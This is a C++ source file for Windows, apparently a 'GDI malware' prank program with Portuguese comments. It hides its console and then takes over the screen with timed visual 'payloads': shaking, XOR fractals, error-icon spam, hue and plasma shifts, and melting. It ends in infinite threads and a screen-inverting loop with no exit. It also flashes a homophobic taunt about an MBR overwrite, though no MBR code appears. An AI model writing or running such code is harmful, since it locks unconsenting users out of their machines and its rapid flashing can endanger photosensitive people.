#include <windows.h>
#include <ctime>
#include <cmath>
#include <thread>
#include <vector>
#include <atomic>

// --- GLOBAIS DE CONTROLE ---
std::atomic<bool> runStage1(true);
std::atomic<bool> runStage2(true);
int sw, sh;

// --- ESTRUTURAS E CONVERSORES DO CÓDIGO 2 ---
struct HSL { float h, s, l; };
struct HSV { float h, s, v; };

float hue2rgb(float p, float q, float t) {
    if (t < 0.0f) t += 1.0f; if (t > 1.0f) t -= 1.0f;
    if (t < 1.0f / 6.0f) return p + (q - p) * 6.0f * t;
    if (t < 1.0f / 2.0f) return q;
    if (t < 2.0f / 3.0f) return p + (q - p) * (2.0f / 3.0f - t) * 6.0f;
    return p;
}

HSL RGBtoHSL(RGBQUAD rgb) {
    float r = rgb.rgbRed / 255.0f, g = rgb.rgbGreen / 255.0f, b = rgb.rgbBlue / 255.0f;
    float max = fmaxf(fmaxf(r, g), b), min = fminf(fminf(r, g), b);
    float h, s, l = (max + min) / 2.0f;
    if (max == min) h = s = 0.0f;
    else {
        float d = max - min;
        s = l > 0.5f ? d / (2.0f - max - min) : d / (max + min);
        if (max == r) h = (g - b) / d + (g < b ? 6 : 0);
        else if (max == g) h = (b - r) / d + 2;
        else h = (r - g) / d + 4;
        h /= 6;
    }
    return { h, s, l };
}

RGBQUAD HSLtoRGB(HSL hsl) {
    float r, g, b, q, p;
    if (hsl.s == 0) r = g = b = hsl.l;
    else {
        q = hsl.l < 0.5f ? hsl.l * (1 + hsl.s) : hsl.l + hsl.s - hsl.l * hsl.s;
        p = 2 * hsl.l - q;
        r = hue2rgb(p, q, hsl.h + 1.0f / 3.0f);
        g = hue2rgb(p, q, hsl.h);
        b = hue2rgb(p, q, hsl.h - 1.0f / 3.0f);
    }
    return { (BYTE)(b * 255), (BYTE)(g * 255), (BYTE)(r * 255), 0 };
}

HSV RGBtoHSV(RGBQUAD rgb) {
    float r = rgb.rgbRed / 255.0f, g = rgb.rgbGreen / 255.0f, b = rgb.rgbBlue / 255.0f;
    float max = fmaxf(fmaxf(r, g), b), min = fminf(fminf(r, g), b);
    float h, s, v = max;
    float d = max - min;
    s = max == 0 ? 0 : d / max;
    if (max == min) h = 0;
    else {
        if (max == r) h = (g - b) / d + (g < b ? 6 : 0);
        else if (max == g) h = (b - r) / d + 2;
        else h = (r - g) / d + 4;
        h /= 6;
    }
    return { h * 360.0f, s, v };
}

RGBQUAD HSVtoRGB(HSV hsv) {
    float r, g, b;
    int i = (int)floor(hsv.h / 60.0f);
    float f = hsv.h / 60.0f - i;
    float p = hsv.v * (1 - hsv.s), q = hsv.v * (1 - f * hsv.s), t = hsv.v * (1 - (1 - f) * hsv.s);
    switch (i % 6) {
    case 0: r = hsv.v, g = t, b = p; break;
    case 1: r = q, g = hsv.v, b = p; break;
    case 2: r = p, g = hsv.v, b = t; break;
    case 3: r = p, g = q, b = hsv.v; break;
    case 4: r = t, g = p, b = hsv.v; break;
    case 5: r = hsv.v, g = p, b = q; break;
    }
    return { (BYTE)(b * 255), (BYTE)(g * 255), (BYTE)(r * 255), 0 };
}

// --- FUNÇÕES DO CÓDIGO 1 (ESTÁGIOS) ---

DWORD WINAPI Stage3_MemoryEffect(LPVOID lpParam) {
    while (runStage1) {
        HDC hdc = GetDC(0); HDC hdcMem = CreateCompatibleDC(hdc);
        HBITMAP bm = CreateCompatibleBitmap(hdc, sw, sh);
        SelectObject(hdcMem, bm);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        BitBlt(hdc, rand() % 2, rand() % 2, sw, sh, hdcMem, rand() % 2, rand() % 2, 0x123456);
        DeleteObject(brush); DeleteObject(bm); DeleteObject(hdcMem);
        ReleaseDC(0, hdc); Sleep(1);
    }
    return 0;
}

DWORD WINAPI Stage4_ErrorIcons(LPVOID lpParam) {
    HICON hIcon = LoadIcon(NULL, IDI_ERROR);
    while (runStage1) {
        HDC hdc = GetDC(0);
        int baseX = rand() % sw, baseY = rand() % sh;
        for (int row = 0; row < 5 && runStage1; row++) {
            for (int col = 0; col <= row; col++) {
                DrawIcon(hdc, baseX + (col * 32) - (row * 16), baseY + (row * 32), hIcon);
            }
            Sleep(10);
        }
        ReleaseDC(0, hdc); Sleep(100);
    }
    return 0;
}

void Stage5_FractalXOR_Limited() {
    HDC hdc = GetDC(NULL); HDC memDC = CreateCompatibleDC(hdc);
    int ws = sw / 2, hs = sh / 2;
    BITMAPINFO bmpi = { 0 };
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = ws; bmpi.bmiHeader.biHeight = -hs;
    bmpi.bmiHeader.biPlanes = 1; bmpi.bmiHeader.biBitCount = 32;
    RGBQUAD* pixels = NULL;
    HBITMAP hBmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&pixels, NULL, 0);
    SelectObject(memDC, hBmp);

    int t = 0;
    while (runStage1) {
        HDC currentDC = GetDC(NULL);
        StretchBlt(memDC, 0, 0, ws, hs, currentDC, 0, 0, sw, sh, SRCCOPY);
        for (int i = 0; i < ws * hs; i++) {
            int x = i % ws, y = i / ws;
            int fractal = (x ^ y ^ t);
            pixels[i].rgbRed ^= (fractal % 255);
            pixels[i].rgbGreen ^= ((fractal * 3) % 255);
            pixels[i].rgbBlue ^= ((fractal * 5) % 255);
        }
        StretchBlt(currentDC, 0, 0, sw, sh, memDC, 0, 0, ws, hs, SRCINVERT);
        t += 2; ReleaseDC(NULL, currentDC); Sleep(10);
    }
    DeleteObject(hBmp); DeleteDC(memDC); ReleaseDC(NULL, hdc);
}

// --- FUNÇÕES DO CÓDIGO 2 (PAYLOADS) ---

void UnifiedShader() {
    HDC hdc = GetDC(0); HDC hdcMem = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { sizeof(BITMAPINFOHEADER), sw, -sh, 1, 32, BI_RGB };
    RGBQUAD* pixels; HBITMAP hbm = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&pixels, NULL, 0);
    SelectObject(hdcMem, hbm);
    while (runStage2) {
        HDC screen = GetDC(0); BitBlt(hdcMem, 0, 0, sw, sh, screen, 0, 0, SRCCOPY);
        for (int i = 0; i < sw * sh; i++) {
            HSL hsl = RGBtoHSL(pixels[i]); hsl.h = fmod(hsl.h + 0.01f, 1.0f); pixels[i] = HSLtoRGB(hsl);
        }
        BitBlt(screen, 0, 0, sw, sh, hdcMem, 0, 0, SRCCOPY); ReleaseDC(0, screen); Sleep(10);
    }
    DeleteObject(hbm); DeleteDC(hdcMem); ReleaseDC(0, hdc);
}

void PlasmaThread() {
    int ws = sw / 4, hs = sh / 4;
    HDC dc = GetDC(NULL); HDC dcMem = CreateCompatibleDC(dc);
    BITMAPINFO bmi = { sizeof(BITMAPINFOHEADER), ws, -hs, 1, 32, BI_RGB };
    RGBQUAD* rgbquad; HBITMAP hbm = CreateDIBSection(dc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(dcMem, hbm);
    for (int i = 0; runStage2; i++) {
        HDC hdc = GetDC(NULL); StretchBlt(dcMem, 0, 0, ws, hs, hdc, 0, 0, sw, sh, SRCCOPY);
        for (int j = 0; j < ws * hs; j++) {
            int x = j % ws, y = j / ws;
            float z = pow(x - (rand() % ws), 2) / 25.0f + pow(y - (rand() % hs), 2) / 9.0f;
            int fx = 128.0 + (128.0 * sin(sqrt(z) / 6.0));
            HSV hsv = RGBtoHSV(rgbquad[j]); hsv.h = fmod(fx + i, 360.0); rgbquad[j] = HSVtoRGB(hsv);
        }
        StretchBlt(hdc, 0, 0, sw, sh, dcMem, 0, 0, ws, hs, SRCCOPY); ReleaseDC(NULL, hdc); Sleep(30);
    }
    DeleteObject(hbm); DeleteDC(dcMem); ReleaseDC(NULL, dc);
}

DWORD WINAPI MeltingThread(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(NULL);
        int rx = rand() % sw;
        BitBlt(hdc, rx, 10, 100, sh, hdc, rx, 0, SRCCOPY);
        ReleaseDC(NULL, hdc); Sleep(5);
    }
}

DWORD WINAPI BytebeatPayload(LPVOID lpParam) {
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (sw * sh) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    while (true) {
        HDC hdc = GetDC(0); HDC hdcMem = CreateCompatibleDC(hdc);
        HBITMAP hbm = CreateCompatibleBitmap(hdc, sw, sh); SelectObject(hdcMem, hbm);
        BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, sw * sh * 4, data);
        int v = 0;
        for (int j = 0; j < sw * sh; j++) {
            if (j % sh == 0 && rand() % 100 == 0) v = rand() % 50;
            BYTE* pixel = (BYTE*)(data + j);
            pixel[j % 3] += pixel[v % 3] ^ (rand() & 0xFF);
        }
        SetBitmapBits(hbm, sw * sh * 4, data);
        BitBlt(hdc, 0, 0, sw, sh, hdcMem, 0, 0, SRCCOPY);
        DeleteObject(hbm); DeleteDC(hdcMem); ReleaseDC(0, hdc); Sleep(10);
    }
}

// --- MAIN ORQUESTRADA ---

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    srand((unsigned)time(NULL));
    sw = GetSystemMetrics(0); sh = GetSystemMetrics(1);

    // INÍCIO CÓDIGO 1 (3 MINUTOS)
    DWORD startCode1 = GetTickCount();

    // Inicia threads de suporte do código 1
    HANDLE hThread3 = CreateThread(NULL, 0, Stage3_MemoryEffect, NULL, 0, NULL);
    HANDLE hThread4 = CreateThread(NULL, 0, Stage4_ErrorIcons, NULL, 0, NULL);

    // Ciclo de Payloads do Código 1
    while (GetTickCount() - startCode1 < 180000) { // 180s = 3 minutos
        DWORD elapsed = GetTickCount() - startCode1;
        HDC hdc = GetDC(0);

        if (elapsed < 10000) { // Shake
            BitBlt(hdc, rand() % 4, rand() % 4, sw, sh, hdc, rand() % 4, rand() % 4, SRCCOPY);
        }
        else if (elapsed < 30000) { // Corrosion
            BitBlt(hdc, rand() % 8, rand() % 3, sw, sh, hdc, rand() % 1, rand() % 5, SRCAND);
        }
        else { // Fractal XOR
            ReleaseDC(0, hdc);
            Stage5_FractalXOR_Limited(); // Essa função agora verifica runStage1
            break;
        }
        ReleaseDC(0, hdc);
        Sleep(10);
    }

    // FINALIZA CÓDIGO 1
    runStage1 = false;
    Sleep(500); // Aguarda threads limparem

    // INÍCIO CÓDIGO 2
    std::thread t1(UnifiedShader);
    Sleep(50000);
    runStage2 = false; t1.join();

    runStage2 = true;
    std::thread t2(PlasmaThread);
    Sleep(30000);
    runStage2 = false; t2.join();

    DWORD startText = GetTickCount();
    while (GetTickCount() - startText < 40000) {
        HDC hdc = GetDC(0); SetBkMode(hdc, TRANSPARENT);
        SetTextColor(hdc, RGB(rand() % 256, rand() % 256, rand() % 256));
        HFONT font = CreateFontA(43, 32, 0, 0, FW_THIN, 0, 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Arial Black");
        SelectObject(hdc, font);
        TextOutA(hdc, rand() % sw, rand() % sh, "If MBR overwrite u are gay", 26);
        DeleteObject(font); ReleaseDC(0, hdc); Sleep(100);
    }

    CreateThread(NULL, 0, MeltingThread, NULL, 0, NULL);
    CreateThread(NULL, 0, BytebeatPayload, NULL, 0, NULL);

    while (true) {
        HDC hdc = GetDC(0);
        PatBlt(hdc, 0, 0, sw, sh, PATINVERT);
        ReleaseDC(0, hdc);
        Sleep(100);
    }

    return 0;
}